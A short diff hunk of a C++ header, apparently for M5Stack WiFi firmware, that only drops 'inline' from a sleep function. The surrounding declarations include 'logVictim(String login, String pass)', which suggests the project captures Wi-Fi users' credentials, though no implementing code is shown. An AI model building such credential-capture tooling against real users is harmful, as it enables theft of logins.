@@ -42,4 +42,4 @@ void logVictim(String login, String pass);
 void drawWifiInfoScreen(String wifiName, String wifiMac, String wifiRRSI, String wifiChanel);
 inline void pushAll();
 inline void updateM5();
-inline void sleepFunction();
+void sleepFunction();
